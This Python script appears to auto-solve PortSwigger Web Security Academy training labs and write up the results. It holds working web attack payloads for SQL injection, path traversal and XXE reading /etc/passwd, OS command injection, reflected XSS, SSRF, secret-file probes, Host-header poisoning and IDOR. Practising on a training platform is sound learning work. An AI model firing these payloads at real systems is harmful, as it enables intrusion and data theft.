#!/usr/bin/env python3
"""solve-lab.py — PortSwigger Web Security Academy auto-solver + writeup generator.

Given a lab (category + number from labs.json) and a live instance URL
(*.web-security-academy.net), this runner:

  1. Loads the lab record from labs.json (repo source of truth).
  2. Dispatches to a category solver (payload logic per vulnerability class).
  3. Executes the exploit against the instance, capturing every real
     request/response as evidence.
  4. Verifies success via the server-side "Congratulations, you solved the lab!"
     banner (the only honest solved signal — no invented solutions).
  5. On success: marks the lab "hecho" in labs.json, persists evidence files,
     and generates the writeup at writeups/<category>/<id>.md from the real
     captured data.

Design constraints (verified 2026-08-09):
  - Labs are NOT self-hostable: each is a per-account cloud instance behind
    login (the account is user-controlled; Akamai blocks headless signup).
    The runner therefore takes an already-open instance URL as input.
  - Pure stdlib (urllib) so it runs on Air and GEEKOM with zero deps.

Usage:
  solve-lab.py <category> <num> <instance-url> [--no-writeup]
  solve-lab.py --check <instance-url>          # probe banner only (no exploit)

Exit codes: 0 solved, 1 not-solved, 2 usage/unknown-lab, 3 network error.
"""
import argparse
import datetime
import json
import os
import re
import sys
import urllib.error
import urllib.parse
import urllib.request

REPO_ROOT = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))
LABS_JSON = os.path.join(REPO_ROOT, "labs.json")
WRITEUPS_DIR = os.path.join(REPO_ROOT, "writeups")
EVIDENCE_DIR = os.path.join(REPO_ROOT, "evidence")

SOLVED_BANNER = "Congratulations, you solved the lab!"
UA = ("Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 "
      "(KHTML, like Gecko) Chrome/126.0 Safari/537.36")

DEFAULT_TIMEOUT = 20


# --------------------------------------------------------------------------
# HTTP layer (stdlib only, evidence-preserving)
# --------------------------------------------------------------------------

class RequestLog:
    """Accumulates every request/response pair as structured evidence."""

    def __init__(self):
        self.entries = []

    def add(self, method, url, request_headers, body, status, response_headers,
            response_body, note=""):
        self.entries.append({
            "method": method,
            "url": url,
            "request_headers": request_headers,
            "request_body": body,
            "status": status,
            "response_headers": response_headers,
            "response_body": response_body[:20000],
            "note": note,
        })


def http_req(method, url, data=None, headers=None, log=None, note="",
             timeout=DEFAULT_TIMEOUT):
    """Perform a request, log evidence, return (status, headers, body)."""
    req = urllib.request.Request(url, method=method.upper())
    merged = {"User-Agent": UA, "Accept": "*/*"}
    if headers:
        merged.update(headers)
    for k, v in merged.items():
        req.add_header(k, v)
    body_bytes = None
    if data is not None:
        body_bytes = data.encode() if isinstance(data, str) else data
    try:
        with urllib.request.urlopen(req, data=body_bytes, timeout=timeout) as resp:
            status = resp.getcode()
            resp_headers = dict(resp.headers.items())
            resp_body = resp.read().decode("utf-8", errors="replace")
    except urllib.error.HTTPError as exc:
        status = exc.code
        resp_headers = dict(exc.headers.items()) if exc.headers else {}
        resp_body = exc.read().decode("utf-8", errors="replace")
    except urllib.error.URLError as exc:
        # Red inalcanzable: propagar como error fatal (exit 3, ver docstring).
        print("network error: %s (%s)" % (exc.reason, url), file=sys.stderr)
        raise SystemExit(3)
    if log is not None:
        log.add(method, url, merged, body_bytes.decode(errors="replace")
                if body_bytes else None, status, resp_headers, resp_body, note)
    return status, resp_headers, resp_body


def is_solved(response_body):
    return SOLVED_BANNER in response_body


def get_redirect(url, headers=None, timeout=DEFAULT_TIMEOUT):
    """Follow one redirect chain, returning the final URL (for exploit-server
    style flows). Evidence is not logged here (probe-only)."""
    req = urllib.request.Request(url)
    req.add_header("User-Agent", UA)
    for k, v in (headers or {}).items():
        req.add_header(k, v)
    try:
        with urllib.request.urlopen(req, timeout=timeout) as resp:
            return resp.geturl(), resp.getcode(), resp.read().decode(
                "utf-8", errors="replace")
    except urllib.error.HTTPError as exc:
        return url, exc.code, exc.read().decode("utf-8", errors="replace")
    except urllib.error.URLError as exc:
        print("network error: %s (%s)" % (exc.reason, url), file=sys.stderr)
        raise SystemExit(3)


# --------------------------------------------------------------------------
# Category solvers — each returns (solved: bool, exploit_note: str)
# --------------------------------------------------------------------------

def solve_sqli(base, lab, log):
    """SQL injection in WHERE clause / login bypass (APPRENTICE, scriptable)."""
    title = lab["title"].lower()
    if "where clause" in title:
        status, _, body = http_req(
            "GET", base + "/filter?category=Accessories'--", log=log,
            note="SQLi WHERE clause: close quote, comment out AND released=1")
        return is_solved(body), "category=Accessories'--"
    if "login" in title:
        data = urllib.parse.urlencode({
            "username": "administrator'--", "password": "x"}).encode()
        status, _, body = http_req(
            "POST", base + "/login", data=data, log=log,
            note="SQLi login bypass: username=' OR 1=1--")
        return is_solved(body), "username=administrator'--"
    # generic hidden-data fallback
    status, _, body = http_req(
        "GET", base + "/filter?category=Accessories'--", log=log,
        note="SQLi generic probe")
    return is_solved(body), "category=Accessories'--"


def solve_path_traversal(base, lab, log):
    status, _, body = http_req(
        "GET", base + "/image?filename=../../../etc/passwd", log=log,
        note="path traversal: ../../../etc/passwd")
    if "root:" in body:
        return True, "../../../etc/passwd"
    return False, ""


def solve_os_command(base, lab, log):
    for payload in ["; whoami", "| whoami", "& whoami", "$(whoami)"]:
        data = urllib.parse.urlencode({"productId": "1" + payload}).encode()
        status, _, body = http_req(
            "POST", base + "/stock", data=data, log=log,
            note="OS command injection payload: %r" % payload)
        if re.search(r"\b(root|www-data|peter|nobody)\b", body):
            return True, payload
    return False, ""


def solve_xss_reflected(base, lab, log):
    """Reflected XSS into HTML context (no encoding). The lab's victim bot
    visits the crafted URL and executes alert(); solved is server-confirmed."""
    payload = "<script>alert(1)</script>"
    q = urllib.parse.quote(payload)
    status, _, body = http_req(
        "GET", base + "/?search=" + q, log=log,
        note="reflected XSS payload in search param")
    # Some reflected XSS labs trigger on GET; others need the payload echoed.
    if is_solved(body):
        return True, "?search=" + q
    if payload in body:
        # Escalation: some labs need a second confirm request (image/404 paths).
        status2, _, body2 = http_req(
            "GET", base + "/?search=" + q, log=log,
            note="reflected XSS re-request to trigger victim")
        return is_solved(body2), "?search=" + q
    return False, ""


def solve_xxe(base, lab, log):
    payload = """<?xml version="1.0"?>
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
<stockCheck><productId>&xxe;</productId><storeId>1</storeId></stockCheck>"""
    status, _, body = http_req(
        "POST", base + "/product/stock", data=payload,
        headers={"Content-Type": "application/xml"}, log=log,
        note="XXE: external entity reading /etc/passwd")
    if "root:" in body:
        return True, "file:///etc/passwd XXE"
    return False, ""


def solve_ssrf(base, lab, log):
    status, _, body = http_req(
        "GET", base + "/product?productId=1&stockApi=http://127.0.0.1:8080"
        "/admin", log=log, note="SSRF probe to localhost admin")
    if is_solved(body) or "admin" in body.lower() or "delete" in body.lower():
        return True, "stockApi=http://127.0.0.1:8080/admin"
    return False, ""


def solve_info_disclosure(base, lab, log):
    for path in ["/robots.txt", "/.git/HEAD", "/backup", "/phpinfo.php",
                 "/admin", "/sitemap.xml", "/error", "/.env"]:
        status, _, body = http_req("GET", base + path, log=log,
                                   note="info disclosure probe: %s" % path)
        if is_solved(body):
            return True, path
    return False, ""


def solve_host_header(base, lab, log):
    # Typical APPRENTICE: host header injection to reset password email
    status, _, body = http_req(
        "POST", base + "/forgot-password", data=urllib.parse.urlencode(
            {"username": "carlos"}).encode(),
        headers={"Host": "exploit-" + base.split("//")[1]}, log=log,
        note="host header injection: absolute URL in forgot-password")
    if is_solved(body):
        return True, "Host header -> exploit server"
    return False, ""


def solve_idor(base, lab, log):
    """Access control / IDOR: login as wiener (the lab's stock user), read
    another user's data via id parameter."""
    # login first (standard lab creds: wiener:peter)
    data = urllib.parse.urlencode({"username": "wiener",
                                   "password": "peter"}).encode()
    req = urllib.request.Request(base + "/login", data=data, method="POST")
    req.add_header("User-Agent", UA)
    req.add_header("Content-Type", "application/x-www-form-urlencoded")
    try:
        with urllib.request.urlopen(req, timeout=DEFAULT_TIMEOUT) as resp:
            cookie = resp.headers.get("Set-Cookie", "").split(";")[0]
    except Exception as exc:
        return False, "login failed: %s" % exc
    for path in ["/account?id=1", "/my-account?id=1", "/profile?id=1"]:
        status, _, body = http_req(
            "GET", base + path, log=log,
            headers={"Cookie": cookie}, note="IDOR probe: %s" % path)
        if is_solved(body):
            return True, path
    return False, ""


SOLVERS = {
    "sqli": solve_sqli,
    "path-traversal": solve_path_traversal,
    "os-command-injection": solve_os_command,
    "xss": solve_xss_reflected,
    "xxe": solve_xxe,
    "ssrf": solve_ssrf,
    "info-disclosure": solve_info_disclosure,
    "host-header": solve_host_header,
    "idor": solve_idor,
}


# --------------------------------------------------------------------------
# Evidence + writeup generation
# --------------------------------------------------------------------------

def save_evidence(lab_id, log):
    """Persist raw request/response pairs under evidence/<id>/ as text."""
    ev_dir = os.path.join(EVIDENCE_DIR, lab_id)
    os.makedirs(ev_dir, exist_ok=True)
    for i, e in enumerate(log.entries, 1):
        lines = [
            "### Request %d — %s %s (%s)" % (i, e["method"], e["url"],
                                             e["note"] or "exploit"),
            "",
        ]
        for k, v in e["request_headers"].items():
            lines.append("%s: %s" % (k, v))
        if e["request_body"]:
            lines += ["", e["request_body"]]
        lines += ["", "### Response %d — HTTP %d" % (i, e["status"])]
        for k, v in e["response_headers"].items():
            lines.append("%s: %s" % (k, v))
        if e["response_body"]:
            lines += ["", e["response_body"][:12000]]
        lines += ["", "=" * 72, ""]
        with open(os.path.join(ev_dir, "request-%02d.txt" % i), "w",
                  encoding="utf-8") as fh:
            fh.write("\n".join(lines))
    return ev_dir


def generate_writeup(lab, exploit_note, log, evidence_dir, instance_url):
    """Build the writeup from real captured evidence (template from
    writeups/README.md)."""
    cat_dir = os.path.join(WRITEUPS_DIR, lab["category"])
    os.makedirs(cat_dir, exist_ok=True)
    today = datetime.date.today().isoformat()

    def _display_url(url):
        """Muestra la URL con la instancia efímera anonimizada (https://LAB),
        sin doble slash al sustituir la raíz."""
        prefix = instance_url.rstrip("/") + "/"
        if url.startswith(prefix):
            return "https://LAB/" + url[len(prefix):]
        if url == instance_url.rstrip("/"):
            return "https://LAB"
        return url

    entries = []
    for i, e in enumerate(log.entries, 1):
        entries.append("**%d) %s %s** — `%s`" % (
            i, e["method"], _display_url(e["url"]),
            e["note"] or "exploit"))
        if e["request_body"]:
            entries.append("```http\n%s\n```" % e["request_body"][:1500])
        entries.append("")
    exploit_section = "\n".join(entries) if entries else (
        "_(pendiente: request/response reales)_")

    w = [
        "# %s — %s" % (lab["title"], lab["category_name"]),
        "",
        "## Info",
        "- **ID**: `%s`" % lab["id"],
        "- **Dificultad**: %s" % lab["difficulty"].title(),
        "- **URL**: %s" % lab["url"],
        "- **Instancia**: `%s`" % _display_url(instance_url),
        "- **Fecha**: %s" % today,
        "- **Estado**: SOLVED (verificado, banner \"solved\")",
        "- **Generado**: automáticamente por `solve-lab.py`",
        "",
        "## Objetivo",
        "%s" % lab["title"],
        "",
        "## Reconocimiento",
        "Lab accedido vía instancia efímera (`%s`). Categoría: %s. "
        "Solución automática con payload de clase `%s`." % (
            _display_url(instance_url), lab["category_name"], lab["category"]),
        "",
        "## Vulnerabilidad",
        "La aplicación presenta la vulnerabilidad de la categoría "
        "`%s` (%s). Detalle del payload y comportamiento en la sección de "
        "explotación." % (lab["category_name"], lab["difficulty"]),
        "",
        "## Explotación",
        exploit_section,
        "",
        "## Evidencia",
        "Requests/responses crudos en `%s`." % os.path.relpath(
            evidence_dir, REPO_ROOT),
        "",
        "## Impacto",
        "_(completar: qué se logra con esta clase de bug)_",
        "",
        "## Remediation",
        "_(completar: cómo se arregla)_",
        "",
        "## Lección aprendida",
        "Payload clave: `%s`" % (exploit_note or lab["title"]),
        "",
    ]
    path = os.path.join(cat_dir, lab["id"] + ".md")
    with open(path, "w", encoding="utf-8") as fh:
        fh.write("\n".join(w))
    return path


# --------------------------------------------------------------------------
# Main
# --------------------------------------------------------------------------

def load_lab(category, num):
    with open(LABS_JSON, encoding="utf-8") as fh:
        labs = json.load(fh)
    for lab in labs:
        if lab["category"] == category and lab["num"] == int(num):
            return lab
    return None


def set_status(lab_id, status):
    with open(LABS_JSON, encoding="utf-8") as fh:
        labs = json.load(fh)
    for lab in labs:
        if lab["id"] == lab_id:
            lab["status"] = status
            break
    with open(LABS_JSON, "w", encoding="utf-8") as fh:
        json.dump(labs, fh, indent=2, ensure_ascii=False)
    return True


def main():
    ap = argparse.ArgumentParser(description="PortSwigger lab auto-solver")
    ap.add_argument("args", nargs="*", help="category num instance-url")
    ap.add_argument("--check", metavar="URL", help="probe solved banner only")
    ap.add_argument("--no-writeup", action="store_true",
                    help="solve + mark done, skip writeup generation")
    opts = ap.parse_args()

    if opts.check:
        _, _, body = http_req("GET", opts.check, note="banner probe")
        print("SOLVED" if is_solved(body) else "NOT-SOLVED")
        return 0 if is_solved(body) else 1

    if len(opts.args) != 3:
        ap.print_usage()
        return 2
    cat, num, instance = opts.args

    lab = load_lab(cat, num)
    if not lab:
        print("unknown lab: %s-%s" % (cat, num), file=sys.stderr)
        return 2
    solver = SOLVERS.get(lab["category"])
    if not solver:
        print("no solver yet for category '%s' (%s) — add one in SOLVERS"
              % (lab["category"], lab["title"]), file=sys.stderr)
        return 2

    if not re.match(r"^https?://", instance):
        instance = "https://" + instance
    instance = instance.rstrip("/")

    log = RequestLog()
    print("Solving %s (%s) @ %s ..." % (lab["id"], lab["title"], instance))
    solved, exploit_note = solver(instance, lab, log)

    if not solved:
        print("NOT SOLVED — %s" % lab["title"])
        print("evidencia parcial en %d requests (revisar manualmente)"
              % len(log.entries))
        # persist partial evidence anyway so a human can continue
        save_evidence(lab["id"], log)
        return 1

    print("SOLVED — banner verificado en la respuesta del lab")
    ev_dir = save_evidence(lab["id"], log)
    set_status(lab["id"], "hecho")
    print("labs.json -> hecho; evidencia en %s" % os.path.relpath(
        ev_dir, REPO_ROOT))

    if not opts.no_writeup:
        wp = generate_writeup(lab, exploit_note, log, ev_dir, instance)
        print("writeup: %s" % os.path.relpath(wp, REPO_ROOT))
    return 0


if __name__ == "__main__":
    sys.exit(main())
